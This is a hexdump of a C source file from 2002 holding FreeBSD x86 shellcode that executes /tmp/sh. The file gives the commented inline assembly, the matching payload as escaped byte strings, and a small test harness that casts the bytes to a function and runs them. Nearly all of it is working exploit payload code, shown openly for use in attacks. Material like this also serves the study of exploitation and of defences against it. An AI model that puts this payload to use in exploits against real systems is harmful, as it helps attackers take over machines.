00000000  2f 2a 0d 0a 20 2a 20 46  72 65 65 42 53 44 20 73  |/*.. * FreeBSD s|
00000010  68 65 6c 6c 63 6f 64 65  20 2d 20 65 78 65 63 76  |hellcode - execv|
00000020  65 20 2f 74 6d 70 2f 73  68 0d 0a 20 2a 20 0d 0a  |e /tmp/sh.. * ..|
00000030  20 2a 20 43 6c 61 65 73  20 4d 2e 20 4e 79 62 65  | * Claes M. Nybe|
00000040  72 67 20 32 30 30 32 30  31 32 30 0d 0a 20 2a 0d  |rg 20020120.. *.|
00000050  0a 20 2a 20 3c 20 63 6d  6e 40 64 61 72 6b 6c 61  |. * < cmn@darkla|
00000060  62 2e 6f 72 67 20 3e 2c  20 3c 20 6d 64 30 63 6c  |b.org >, < md0cl|
00000070  61 65 73 40 6d 64 73 74  75 64 2e 63 68 61 6c 6d  |aes@mdstud.chalm|
00000080  65 72 73 2e 73 65 20 3e  0d 0a 20 2a 2f 0d 0a 0d  |ers.se >.. */...|
00000090  0a 2f 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |./**************|
000000a0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000000c0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 0d 0a 76 6f  |************..vo|
000000d0  69 64 0d 0a 6d 61 69 6e  28 29 0d 0a 7b 0d 0a 5f  |id..main()..{.._|
000000e0  5f 61 73 6d 5f 5f 28 22  0d 0a 20 20 20 20 20 20  |_asm__("..      |
000000f0  20 20 78 6f 72 6c 20 20  20 20 25 65 61 78 2c 20  |  xorl    %eax, |
00000100  25 65 61 78 20 20 20 23  20 65 61 78 20 3d 20 30  |%eax   # eax = 0|
00000110  0d 0a 20 20 20 20 20 20  20 20 70 75 73 68 6c 20  |..        pushl |
00000120  20 20 25 65 61 78 20 20  20 20 20 20 20 20 20 23  |  %eax         #|
00000130  20 73 74 72 69 6e 67 20  65 6e 64 73 20 77 69 74  | string ends wit|
00000140  68 20 4e 55 4c 4c 0d 0a  20 20 20 20 20 20 20 20  |h NULL..        |
00000150  70 75 73 68 6c 20 20 20  24 30 78 36 38 37 33 32  |pushl   $0x68732|
00000160  66 32 66 20 20 23 20 70  75 73 68 20 27 68 73 2f  |f2f  # push 'hs/|
00000170  2f 27 20 28 2f 2f 73 68  29 0d 0a 20 20 20 20 20  |/' (//sh)..     |
00000180  20 20 20 70 75 73 68 6c  20 20 20 24 30 78 37 30  |   pushl   $0x70|
00000190  36 64 37 34 32 66 20 20  23 20 70 75 73 68 20 27  |6d742f  # push '|
000001a0  70 6d 74 2f 27 20 28 2f  74 6d 70 29 0d 0a 20 20  |pmt/' (/tmp)..  |
000001b0  20 20 20 20 20 20 6d 6f  76 6c 20 20 20 20 25 65  |      movl    %e|
000001c0  73 70 2c 20 25 65 62 78  20 20 20 23 20 65 62 78  |sp, %ebx   # ebx|
000001d0  20 3d 20 61 72 67 76 5b  30 5d 20 3d 20 73 74 72  | = argv[0] = str|
000001e0  69 6e 67 20 61 64 64 72  0d 0a 20 20 20 20 20 20  |ing addr..      |
000001f0  20 20 70 75 73 68 6c 20  20 20 25 65 61 78 20 20  |  pushl   %eax  |
00000200  20 20 20 20 20 20 20 23  20 61 72 67 76 5b 31 5d  |       # argv[1]|
00000210  20 3d 20 4e 55 4c 4c 0d  0a 20 20 20 20 20 20 20  | = NULL..       |
00000220  20 70 75 73 68 6c 20 20  20 25 65 62 78 20 20 20  | pushl   %ebx   |
00000230  20 20 20 20 20 20 23 20  61 72 67 76 5b 30 5d 20  |      # argv[0] |
00000240  3d 20 2f 62 69 6e 2f 2f  73 68 0d 0a 20 20 20 20  |= /bin//sh..    |
00000250  20 20 20 20 6d 6f 76 6c  20 20 20 20 25 65 73 70  |    movl    %esp|
00000260  2c 20 25 65 64 78 20 20  20 23 20 65 64 78 20 3d  |, %edx   # edx =|
00000270  20 26 61 72 67 76 5b 30  5d 0d 0a 20 20 20 20 20  | &argv[0]..     |
00000280  20 20 20 0d 0a 20 20 20  20 20 20 20 20 70 75 73  |   ..        pus|
00000290  68 6c 20 20 20 25 65 61  78 20 20 20 20 20 20 20  |hl   %eax       |
000002a0  20 20 23 20 65 6e 76 70  20 3d 20 4e 55 4c 4c 0d  |  # envp = NULL.|
000002b0  0a 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |.        pushl  |
000002c0  20 25 65 64 78 20 20 20  20 20 20 20 20 20 23 20  | %edx         # |
000002d0  26 61 72 67 76 5b 30 5d  0d 0a 20 20 20 20 20 20  |&argv[0]..      |
000002e0  20 20 70 75 73 68 6c 20  20 20 25 65 62 78 20 20  |  pushl   %ebx  |
000002f0  20 20 20 20 20 20 20 23  20 2a 70 61 74 68 20 3d  |       # *path =|
00000300  20 61 72 67 76 5b 30 5d  0d 0a 20 20 20 20 20 20  | argv[0]..      |
00000310  20 20 70 75 73 68 6c 20  20 20 25 65 61 78 20 20  |  pushl   %eax  |
00000320  20 20 20 20 20 20 20 23  20 44 75 6d 6d 79 0d 0a  |       # Dummy..|
00000330  20 20 20 20 20 20 20 20  6d 6f 76 62 20 20 20 20  |        movb    |
00000340  24 30 78 33 62 2c 20 25  61 6c 20 20 20 23 20 61  |$0x3b, %al   # a|
00000350  6c 20 3d 20 35 39 20 3d  20 65 78 65 63 76 65 0d  |l = 59 = execve.|
00000360  0a 20 20 20 20 20 20 20  20 69 6e 74 20 20 20 20  |.        int    |
00000370  20 24 30 78 38 30 20 20  20 20 20 20 20 20 23 20  | $0x80        # |
00000380  65 78 65 63 76 65 28 61  72 67 76 5b 30 5d 2c 20  |execve(argv[0], |
00000390  61 72 67 76 2c 20 4e 55  4c 4c 29 0d 0a 0d 0a 20  |argv, NULL).... |
000003a0  20 20 20 20 20 20 20 78  6f 72 6c 20 20 20 20 25  |       xorl    %|
000003b0  65 61 78 2c 20 25 65 61  78 20 20 20 23 20 65 61  |eax, %eax   # ea|
000003c0  78 20 3d 20 30 0d 0a 20  20 20 20 20 20 20 20 69  |x = 0..        i|
000003d0  6e 63 20 20 20 20 20 25  65 61 78 20 20 20 20 20  |nc     %eax     |
000003e0  20 20 20 20 23 20 65 61  78 2b 2b 0d 0a 20 20 20  |    # eax++..   |
000003f0  20 20 20 20 20 70 75 73  68 6c 20 20 20 25 65 61  |     pushl   %ea|
00000400  78 20 20 20 20 20 20 20  20 20 23 20 45 78 69 74  |x         # Exit|
00000410  20 76 61 6c 75 65 20 3d  20 31 0d 0a 20 20 20 20  | value = 1..    |
00000420  20 20 20 20 70 75 73 68  6c 20 20 20 25 65 61 78  |    pushl   %eax|
00000430  20 20 20 20 20 20 20 20  20 23 20 44 75 6d 6d 79  |         # Dummy|
00000440  0d 0a 20 20 20 20 20 20  20 20 69 6e 74 20 20 20  |..        int   |
00000450  20 20 24 30 78 38 30 20  20 20 20 20 20 20 20 23  |  $0x80        #|
00000460  20 65 78 69 74 28 31 29  3b 20 28 65 61 78 20 69  | exit(1); (eax i|
00000470  73 20 31 20 3d 20 65 78  65 63 76 65 29 0d 0a 20  |s 1 = execve).. |
00000480  20 20 20 22 29 3b 0d 0a  7d 0d 0a 2a 2a 2a 2a 2a  |   ");..}..*****|
00000490  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000004c0  2a 2a 2a 2a 2a 2a 2a 2f  0d 0a 0d 0a 23 69 6e 63  |*******/....#inc|
000004d0  6c 75 64 65 20 22 73 74  64 69 6f 2e 68 22 0d 0a  |lude "stdio.h"..|
000004e0  23 69 6e 63 6c 75 64 65  20 22 73 74 72 69 6e 67  |#include "string|
000004f0  2e 68 22 0d 0a 0d 0a 73  74 61 74 69 63 20 63 68  |.h"....static ch|
00000500  61 72 20 66 72 65 65 62  73 64 5f 63 6f 64 65 5b  |ar freebsd_code[|
00000510  5d 20 3d 0d 0a 20 20 20  20 22 5c 78 33 31 5c 78  |] =..    "\x31\x|
00000520  63 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0"             |
00000530  20 20 2f 2a 20 78 6f 72  6c 20 20 20 20 25 65 61  |  /* xorl    %ea|
00000540  78 2c 20 25 65 61 78 20  20 2a 2f 0d 0a 20 20 20  |x, %eax  */..   |
00000550  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
00000560  20 20 20 20 20 20 20 20  20 20 2f 2a 20 70 75 73  |          /* pus|
00000570  68 6c 20 20 20 25 65 61  78 20 20 20 20 20 20 20  |hl   %eax       |
00000580  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 36 38 5c 78  | */..    "\x68\x|
00000590  32 66 5c 78 32 66 5c 78  37 33 5c 78 36 38 22 20  |2f\x2f\x73\x68" |
000005a0  20 20 2f 2a 20 70 75 73  68 6c 20 20 20 24 30 78  |  /* pushl   $0x|
000005b0  36 38 37 33 32 66 32 66  20 2a 2f 0d 0a 20 20 20  |68732f2f */..   |
000005c0  20 22 5c 78 36 38 5c 78  32 66 5c 78 37 34 5c 78  | "\x68\x2f\x74\x|
000005d0  36 64 5c 78 37 30 22 20  20 20 2f 2a 20 70 75 73  |6d\x70"   /* pus|
000005e0  68 6c 20 20 20 24 30 78  37 30 36 64 37 34 32 66  |hl   $0x706d742f|
000005f0  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 38 39 5c 78  | */..    "\x89\x|
00000600  65 33 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |e3"             |
00000610  20 20 2f 2a 20 6d 6f 76  6c 20 20 20 20 25 65 73  |  /* movl    %es|
00000620  70 2c 20 25 65 62 78 20  20 2a 2f 0d 0a 20 20 20  |p, %ebx  */..   |
00000630  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
00000640  20 20 20 20 20 20 20 20  20 20 2f 2a 20 70 75 73  |          /* pus|
00000650  68 6c 20 20 20 25 65 61  78 20 20 20 20 20 20 20  |hl   %eax       |
00000660  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 35 33 22 20  | */..    "\x53" |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000680  20 20 2f 2a 20 70 75 73  68 6c 20 20 20 25 65 62  |  /* pushl   %eb|
00000690  78 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |x        */..   |
000006a0  20 22 5c 78 38 39 5c 78  65 32 22 20 20 20 20 20  | "\x89\xe2"     |
000006b0  20 20 20 20 20 20 20 20  20 20 2f 2a 20 6d 6f 76  |          /* mov|
000006c0  6c 20 20 20 20 25 65 73  70 2c 20 25 65 64 78 20  |l    %esp, %edx |
000006d0  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 35 30 22 20  | */..    "\x50" |
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006f0  20 20 2f 2a 20 70 75 73  68 6c 20 20 20 25 65 61  |  /* pushl   %ea|
00000700  78 20 20 20 20 20 20 20  20 2a 2f 20 20 20 20 20  |x        */     |
00000710  0d 0a 20 20 20 20 22 5c  78 35 32 22 20 20 20 20  |..    "\x52"    |
00000720  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000730  2a 20 70 75 73 68 6c 20  20 20 25 65 64 78 20 20  |* pushl   %edx  |
00000740  20 20 20 20 20 20 2a 2f  20 20 20 20 0d 0a 20 20  |      */    ..  |
00000750  20 20 22 5c 78 35 33 22  20 20 20 20 20 20 20 20  |  "\x53"        |
00000760  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 70 75  |           /* pu|
00000770  73 68 6c 20 20 20 25 65  62 78 20 20 20 20 20 20  |shl   %ebx      |
00000780  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 35 30 22  |  */..    "\x50"|
00000790  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007a0  20 20 20 2f 2a 20 70 75  73 68 6c 20 20 20 25 65  |   /* pushl   %e|
000007b0  61 78 20 20 20 20 20 20  20 20 2a 2f 0d 0a 20 20  |ax        */..  |
000007c0  20 20 22 5c 78 62 30 5c  78 33 62 22 20 20 20 20  |  "\xb0\x3b"    |
000007d0  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 6d 6f  |           /* mo|
000007e0  76 62 20 20 20 20 24 30  78 33 62 2c 20 25 61 6c  |vb    $0x3b, %al|
000007f0  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 63 64 5c  |  */..    "\xcd\|
00000800  78 38 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x80"            |
00000810  20 20 20 2f 2a 20 69 6e  74 20 20 20 20 20 24 30  |   /* int     $0|
00000820  78 38 30 20 20 20 20 20  20 20 2a 2f 0d 0a 20 20  |x80       */..  |
00000830  20 20 22 5c 78 33 31 5c  78 63 30 22 20 20 20 20  |  "\x31\xc0"    |
00000840  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 78 6f  |           /* xo|
00000850  72 6c 20 20 20 20 25 65  61 78 2c 20 25 65 61 78  |rl    %eax, %eax|
00000860  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 34 30 22  |  */..    "\x40"|
00000870  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000880  20 20 20 2f 2a 20 69 6e  63 20 20 20 20 20 25 65  |   /* inc     %e|
00000890  61 78 20 20 20 20 20 20  20 20 2a 2f 20 0d 0a 20  |ax        */ .. |
000008a0  20 20 20 22 5c 78 35 30  22 20 20 20 20 20 20 20  |   "\x50"       |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 70  |            /* p|
000008c0  75 73 68 6c 20 20 20 25  65 61 78 20 20 20 20 20  |ushl   %eax     |
000008d0  20 20 20 2a 2f 0d 0a 20  20 20 20 22 5c 78 35 30  |   */..    "\x50|
000008e0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000008f0  20 20 20 20 2f 2a 20 70  75 73 68 6c 20 20 20 25  |    /* pushl   %|
00000900  65 61 78 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |eax        */.. |
00000910  20 20 20 22 5c 78 63 64  5c 78 38 30 22 3b 20 20  |   "\xcd\x80";  |
00000920  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 69  |            /* i|
00000930  6e 74 20 20 20 20 20 24  30 78 38 30 20 20 20 20  |nt     $0x80    |
00000940  20 20 20 2a 2f 0d 0a 0d  0a 0d 0a 73 74 61 74 69  |   */......stati|
00000950  63 20 63 68 61 72 20 5f  66 72 65 65 62 73 64 5f  |c char _freebsd_|
00000960  63 6f 64 65 5b 5d 20 3d  0d 0a 20 20 20 20 22 5c  |code[] =..    "\|
00000970  78 33 31 5c 78 63 30 5c  78 35 30 5c 78 36 38 5c  |x31\xc0\x50\x68\|
00000980  78 32 66 5c 78 32 66 5c  78 37 33 5c 78 36 38 22  |x2f\x2f\x73\x68"|
00000990  0d 0a 20 20 20 20 22 5c  78 36 38 5c 78 32 66 5c  |..    "\x68\x2f\|
000009a0  78 37 34 5c 78 36 64 5c  78 37 30 5c 78 38 39 5c  |x74\x6d\x70\x89\|
000009b0  78 65 33 5c 78 35 30 22  0d 0a 20 20 20 20 22 5c  |xe3\x50"..    "\|
000009c0  78 35 33 5c 78 38 39 5c  78 65 32 5c 78 35 30 5c  |x53\x89\xe2\x50\|
000009d0  78 35 32 5c 78 35 33 5c  78 35 30 5c 78 62 30 22  |x52\x53\x50\xb0"|
000009e0  0d 0a 20 20 20 20 22 5c  78 33 62 5c 78 63 64 5c  |..    "\x3b\xcd\|
000009f0  78 38 30 5c 78 33 31 5c  78 63 30 5c 78 34 30 5c  |x80\x31\xc0\x40\|
00000a00  78 35 30 5c 78 35 30 22  0d 0a 20 20 20 20 22 5c  |x50\x50"..    "\|
00000a10  78 63 64 5c 78 38 30 22  3b 0d 0a 0d 0a 76 6f 69  |xcd\x80";....voi|
00000a20  64 0d 0a 6d 61 69 6e 28  76 6f 69 64 29 0d 0a 7b  |d..main(void)..{|
00000a30  0d 0a 09 76 6f 69 64 20  28 2a 63 6f 64 65 29 28  |...void (*code)(|
00000a40  29 20 3d 20 28 76 6f 69  64 20 2a 29 66 72 65 65  |) = (void *)free|
00000a50  62 73 64 5f 63 6f 64 65  3b 0d 0a 09 70 72 69 6e  |bsd_code;...prin|
00000a60  74 66 28 22 73 74 72 6c  65 6e 20 63 6f 64 65 3a  |tf("strlen code:|
00000a70  20 25 64 5c 6e 22 2c 20  73 74 72 6c 65 6e 28 66  | %d\n", strlen(f|
00000a80  72 65 65 62 73 64 5f 63  6f 64 65 29 29 3b 0d 0a  |reebsd_code));..|
00000a90  09 63 6f 64 65 28 29 3b  0d 0a 7d                 |.code();..}|
00000a9b
